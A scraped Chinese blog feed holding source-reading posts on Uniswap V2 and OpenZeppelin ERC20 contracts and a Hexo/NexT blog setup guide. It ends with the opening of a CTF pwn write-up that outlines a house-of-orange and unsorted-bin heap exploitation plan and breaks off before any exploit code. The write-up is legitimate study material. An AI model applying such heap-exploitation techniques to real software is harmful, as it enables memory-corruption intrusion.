<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// force balances to match reserves</span><br><span class="line">function skim(address to) external lock &#123;</span><br><span class="line">    address _token0 = token0; // gas savings</span><br><span class="line">    address _token1 = token1; // gas savings</span><br><span class="line">    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));</span><br><span class="line">    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// force reserves to match balances</span><br><span class="line">function sync() external lock &#123;</span><br><span class="line">    _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_update 函数主要用于更新
reserves，并且增加价格累加器。由于价格累加器和 timeElapsed
都是以差值的形式被使用，因此无需考虑溢出的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;</span><br><span class="line">    require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);</span><br><span class="line">    uint32 blockTimestamp = uint32(block.timestamp % 2**32);</span><br><span class="line">    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired</span><br><span class="line">    if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;</span><br><span class="line">        // * never overflows, and + overflow is desired</span><br><span class="line">        price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;</span><br><span class="line">        price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;</span><br><span class="line">    &#125;</span><br><span class="line">    reserve0 = uint112(balance0);</span><br><span class="line">    reserve1 = uint112(balance1);</span><br><span class="line">    blockTimestampLast = blockTimestamp;</span><br><span class="line">    emit Sync(reserve0, reserve1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 _mintFee 是 Uniswap V2
中用于计算和分配协议费用的函数。它根据流动性池的变化情况，决定是否铸造新的
LP 代币并将其分配给协议费用接收地址。据函数实现有下述公式</p>
<p><span class="math display">\[
\Delta_{LP} = \frac{totalSupply \times (\sqrt{r_0^* \times r_1^*} -
\sqrt{r_0 \times r_1})}{5 \times \sqrt{r_0^* \times r_1^*} + \sqrt{r_0
\times r_1}}
\]</span></p>
<p>其中： - ( r_0 ) 和 ( r_1 ) 是上一次更新时的储备量。 - ( r_0^* ) 和 (
r_1^* ) 是当前的储备量。</p>
<p>仓库代码说 "if fee is on, mint liquidity equivalent to 1/6th of the
growth in sqrt(k)"，但举例可以发现铸造的 LP token 并不近似于 sqrt(k)
增量的 1/6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;</span><br><span class="line">    address feeTo = IUniswapV2Factory(factory).feeTo();</span><br><span class="line">    feeOn = feeTo != address(0);</span><br><span class="line">    uint _kLast = kLast; // gas savings</span><br><span class="line">    if (feeOn) &#123;</span><br><span class="line">        if (_kLast != 0) &#123;</span><br><span class="line">            uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));</span><br><span class="line">            uint rootKLast = Math.sqrt(_kLast);</span><br><span class="line">            if (rootK &gt; rootKLast) &#123;</span><br><span class="line">                uint numerator = totalSupply.mul(rootK.sub(rootKLast));</span><br><span class="line">                uint denominator = rootK.mul(5).add(rootKLast);</span><br><span class="line">                uint liquidity = numerator / denominator;</span><br><span class="line">                if (liquidity &gt; 0) _mint(feeTo, liquidity);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (_kLast != 0) &#123;</span><br><span class="line">        kLast = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>burn 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address to) external lock returns (uint amount0, uint amount1) &#123;</span><br><span class="line">    (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">    address _token0 = token0;                                // gas savings</span><br><span class="line">    address _token1 = token1;                                // gas savings</span><br><span class="line">    uint balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">    uint balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">    uint liquidity = balanceOf[address(this)];</span><br><span class="line"></span><br><span class="line">    bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">    uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">    amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">    amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">    require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);</span><br><span class="line">    _burn(address(this), liquidity);</span><br><span class="line">    _safeTransfer(_token0, to, amount0);</span><br><span class="line">    _safeTransfer(_token1, to, amount1);</span><br><span class="line">    balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">    balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">    _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">    if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">    emit Burn(msg.sender, amount0, amount1, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - openzeppelin 源码阅读</title>
    <url>/posts/18184.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
就像做 pwn 要读 glibc 源码，做 blockchain 怎么能不分析 openzeppelin 呢
</blockquote>
<span id="more"></span>
<h1 id="erc20">[1] ERC20</h1>
<p>ERC20 是以太坊上最基本的代币规范</p>
<p><a
href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">openzeppelin
ERC20 源码在这</a></p>
<p>以下是该合约的变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; uint256) private _balances; // account 该 token 的余额</span><br><span class="line">// account 批准 spender 使用的余额，实际上花的还是 account 的 tokens</span><br><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances; </span><br><span class="line">uint256 private _totalSupply; // 该合约总共发行的 token 数</span><br><span class="line">string private _name;         // 该 token 的 name</span><br><span class="line">string private _symbol;       // 简约版的 token name，比如</span><br></pre></td></tr></table></figure>
<p>下面是一些比较易懂的函数接口(基本都是 getter 函数)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor(string memory name_, string memory symbol_);      // ERC20(&quot;HeyGapToken&quot;, &quot;HGT&quot;)</span><br><span class="line">function name() public view virtual returns (string memory);  // 返回 HeyGapToken</span><br><span class="line">function symbol() public view virtual returns (string memory);// 返回 HGT</span><br><span class="line">function decimals() public view virtual returns (uint8);      // 返回 18, 就是 1e18 的那个 18</span><br><span class="line">function totalSupply() public view virtual returns (uint256)  // 返回 totalsupply</span><br><span class="line">function balanceOf(address account) public view virtual returns (uint256) // 返回账户余额</span><br><span class="line">// 返回 owner 批准 spender 的开销 _allowances[owner][spender]</span><br><span class="line">function allowance(address owner, address spender) public view virtual returns (uint256);</span><br></pre></td></tr></table></figure>
<p>update 相关函数：该函数用于更新 _totalSupply, _balances
这两个变量，值得注意的是这些变量都不会溢出，因为 value &lt;= fromBalance
&lt;= totalSupply</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>transfer 相关函数：将 msg.sender 的钱转移给 to，会检测 msg.sender 和
to 是不是 address(0)，如果是的话就 revert</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>approve 相关函数：增加 msg.sender 的 spender 余额，其中
_approve(address, address, uint, bool) 这个函数是可以由用户重写的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">    _approve(owner, spender, value, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (spender == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) &#123;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>transferFrom相关函数：approve 函数 和 transfer 函数的结合。假设 A
通过 approve 函数批准 B 花销 A 的 x 个 token，那么 B 就可以调用
transferFrom 函数来花费不超过 x 个 token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance &lt; type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="erc721">[1] ERC721</h1>
<p>ERC721 是以太坊上“同质化代币”的规范</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 博客配置与美化</title>
    <url>/posts/53464.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
鉴于我自己的创作欲，准备正式地经营我的博客XD
</blockquote>
<span id="more"></span>
<h1 id="xf-categories">0xF categories</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories: &#123;</span><br><span class="line">  - Geek tech: 安全弱相关技术</span><br><span class="line">  - Software analysis technology: 软件分析技术</span><br><span class="line">  - CTF_practice：CTF 比赛wp及日常题目</span><br><span class="line">  - CTF_Theory: CTF 中的理论知识</span><br><span class="line">  - IOT: 物联网相关技术</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="x0-说在前面">0x0 说在前面:</h1>
<blockquote>
<p>环境：Win11 参考资料：CodeSheep师傅在b站上的视频 &amp;
Next官方文档</p>
</blockquote>
<blockquote>
<p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
</blockquote>
<h1 id="x1-hexo初始化一个博客">0x1 Hexo初始化一个博客</h1>
<p>首先，我们需要在<a
href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>
&gt;👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
<p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
<hr />
<p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
<p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
<p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
<p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
<blockquote>
<p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
</blockquote>
<h1 id="x2-hexo-config-theme-config">0x2 Hexo config &amp; Theme
config</h1>
<p>我使用的这一个主题👇，这里具体讲讲博客的配置 <a
href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a>
为了描述方便，在以下说明中： 将<strong><em>hexo
init生成的config文件</em></strong>称为<code>站点配置文件</code>
将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
<hr />
<ul>
<li>配置主题 在hexo站点目录中用终端输入👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
打开<strong><em>站点配置文件</em></strong>，修改: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>个人偏好-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>站点图像-<strong><em>主题配置文件</em></strong>
修改之前记得在themes\next，图像尺寸要符合16x16和32x32 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>社交链接-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>站点配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<strong><em>主题配置文件</em></strong>：添加 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr />
<ul>
<li>引用示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
靡不有初 鲜克有终
<p>
<p>
<br>《诗经》
</blockquote></li>
</ul>
<hr />
<ul>
<li>更大更有吸引力的图片来源于<code>&lt;img src="/image-url" class="full-image" /&gt;</code></li>
</ul>
<hr />
<ul>
<li>Bootstrap Callout使用方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
<div class="note default flat"><p>default</p>
</div>
<div class="note primary flat"><p>primary</p>
</div>
<div class="note success flat"><p>success</p>
</div>
<div class="note info flat"><p>info</p>
</div>
<div class="note warning flat"><p>warning</p>
</div>
<div class="note danger flat"><p>danger</p>
</div>
<hr />
<h1 id="x3-latex配置">0x3 LaTex配置</h1>
<blockquote>
<p>我这边pandoc总是出错，于是转用了kramed</p>
</blockquote>
<p>终端输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>主题配置文件</em></strong></p>
<blockquote>
<p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
<p>记得在需要渲染的md加入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the <span class="math inline">\(X_{n-1}\)</span></p>
<blockquote>
<p>不过渲染后就导致写md时多了几个规矩</p>
<ol type="1">
<li>---的上下必须各空一格</li>
</ol>
</blockquote>
<p><a
href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">【公式】KaTeX
使用指南（洛谷特供） - 白色过膝袜 - 洛谷博客 (luogu.com.cn)</a></p>
<h1 id="x4-hexo-x-next-美化">0x4 Hexo x Next 美化</h1>
<ul>
<li>动态背景 在<strong><em>站点目录</em></strong>打开git，输入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure> 在<strong><em>主题配置文件</em></strong>中加入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>记得把其他的动态背景关闭呀，比如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
<hr />
<ul>
<li>文章结尾
在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font
Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
</ul>
<hr />
<ul>
<li>代码块复制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>回到顶部与阅读进度 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure> 附一些参考资料XD~</li>
</ul>
<p><a
href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科
(baidu.com)</a></p>
<hr />
<ul>
<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>链接样式
修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<p>参考文章👇</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo
NexT主题美化总结 | MickeyMiao</a></p>
<p>深度美化-放着吃灰</p>
<p><a
href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a>
<a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey
管理你的博客 - 知乎 (zhihu.com)</a> <a
href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next
主题博客个性化配置超详细，超全面(两万字)</a></p>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023SICTF-Pwn-baby_heap-wp</title>
    <url>/posts/27539.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
baby一点都不baby...houseoforange+unsortedbinattack
</blockquote>
<span id="more"></span>
<h1 id="x00-逆向分析">0x00 逆向分析</h1>
<ol type="1">
<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
pwn'了解到有可能是houseoforange</li>
<li>add函数，两个约束（1. 最多申请32个chunk 2.
chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
attack或者unsortedbin
attack来打（但这里没有free，就导致fastbin很难利用） <img
src="/pic/Pasted%20image%2020230922101040.png" /></li>
<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
<li>show函数，只打印了8个字节就很难受 <img
src="/pic/Pasted%20image%2020230922101901.png" /></li>
</ol>
<h1 id="x01-思路分析">0x01 思路分析</h1>
<ol type="1">
<li>我们肯定是要实现“leak libc”和“Any Address Write”
<ol type="1">
<li>leak libc
<ol type="1">
<li>思路1：unsortedbin leak
<ol type="1">
